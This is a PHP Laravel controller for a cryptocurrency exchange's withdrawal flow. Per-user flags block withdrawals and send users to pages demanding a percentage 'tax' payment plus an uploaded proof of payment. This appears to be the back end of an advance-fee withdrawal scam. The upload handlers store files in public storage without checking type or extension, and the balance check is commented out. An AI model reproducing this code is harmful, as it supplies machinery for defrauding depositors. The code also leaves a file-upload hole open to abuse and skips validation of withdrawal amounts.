<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Models\Balance;
use App\Models\Withdrawal;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class TaxController extends Controller
{
    public function index1()
    {
        $data = DB::table('manuel_deposit_usd')->where('id', 1)->first();
        $proof = DB::table('tax_proof')->first();
        $tax = DB::table('tax')->first();

        return view('exchange.tin1', [
            'data' => $data,
            'proof' => $proof,
            'tax' => $tax,
        ]);
    }

    public function upload_payment_one(Request $request)
    {
        $data = DB::table('tax_proof')->where('user_id', auth()->user()->id)->first();

        $filename = $request->file('file');

        $newfilename = time().'.'.$filename->getClientOriginalExtension();

        $request->file('file')->storeAs('image', $newfilename, 'public');

        if ($data) {

            DB::table('tax_proof')->where('user_id', auth()->user()->id)->update([
                'name' => auth()->user()->first_name,
                'proof_one' => $newfilename,
                'status_one' => '0',
                'date' => Carbon::now(),
            ]);

            return back()->with('status', 'Your payment proof has been received awaiting confirmation');

        } else {

            DB::table('tax_proof')->insert([
                'user_id' => auth()->guard('web')->user()->id,
                'name' => auth()->user()->first_name,
                'proof_one' => $newfilename,
                'status_one' => '0',
                'date' => Carbon::now(),
            ]);

            return back()->with('status', 'Your payment proof has been received awaiting confirmation ');

        }

    }

    public function index1_function(Request $request)
    {

        session(['amount' => $request->amount]);
        session(['name' => $request->name]);
        session(['address' => $request->address]);

        if (auth()->user()->level_set == 'off' && auth()->user()->withdrawal == 'off' && auth()->user()->tax == '0') {
            Balance::whereUserId(auth()->guard('web')->user()->id)->where('symbol', $request->name)->decrement('amount', $request->amount);
            Withdrawal::create([
                'user_id' => auth()->guard('web')->user()->id,
                'type' => $request->name,
                'address' => $request->address,
                'amount' => $request->amount,
                'status' => 'pending',
            ]);

            return response()->json(['level_set' => 'true']);

        } elseif (auth()->user()->withdrawal == 'on' && auth()->user()->level_set == 'off' && auth()->user()->tax == '0') {
            return response()->json(['off' => 'true']);
        } elseif (auth()->user()->withdrawal == 'on' && auth()->user()->level_set == 'on' && auth()->user()->tax == '1') {

            return response()->json(['off' => 'true']);

        } elseif (auth()->user()->withdrawal == 'off' && auth()->user()->level_set == 'on' && auth()->user()->tax == '0') {
            return response()->json(['error' => 'true']);
        } else {
            return response()->json(['status' => 'true']);
        }

    }

    public function index2()
    {
        $data = DB::table('manuel_deposit_usd')->where('id', 1)->first();

        return view('exchange.tin2', [
            'data' => $data,
        ]);
    }

    public function index3()
    {
        $proof = DB::table('tax_proof')->first();
        $data = DB::table('manuel_deposit_usd')->where('id', 1)->first();
        $tax = DB::table('tax')->first();

        $value = session('amount') ?? 0;
        $name = session('name');

        // $percentage = 0.2 * $value;
        $divided_amount = ($tax->percentage / 100) * $value;

        return view('exchange.tin3', [
            'proof' => $proof,
            'data' => $data,
            'value' => $divided_amount,
            'name' => $name,
            'tax' => $tax,
        ]);
    }

    public function upload_payment_two(Request $request)
    {

        $filename = $request->file('file');

        $newfilename = time().'.'.$filename->getClientOriginalExtension();

        $request->file('file')->storeAs('image', $newfilename, 'public');

        DB::table('tax_proof')->where('user_id', auth()->user()->id)->update([
            'name' => auth()->user()->first_name,
            'proof_two' => $newfilename,
            'status_two' => '0',
            'date' => Carbon::now(),
        ]);

        return back()->with('status', 'Your payment proof has been received awaiting confirmation');
    }

    public function complete_withdrawal(Request $request)
    {

        // if($request->amount > auth()->guard('web')->user()->balance->amount){
        //     return response()->json(["error"=>"Sorry You Do don't have enough fund"]);
        // }
        $value = session('amount');
        $name = session('name');

        if (! $value || ! $name) {
            return redirect()->back()->with('error', 'Withdrawal session expired. Please try again.');
        }

        Balance::whereUserId(auth()->guard('web')->user()->id)->where('symbol', $name)->decrement('amount', $value);

        Withdrawal::create([
            'user_id' => auth()->guard('web')->user()->id,
            'type' => session('name'),
            'address' => session('address'),
            'amount' => session('amount'),
            'status' => 'pending',
        ]);

        session()->forget(['name', 'address', 'amount']);

        return redirect()->route('home')->with('status','Your withdrawal has been complete');

    }
}
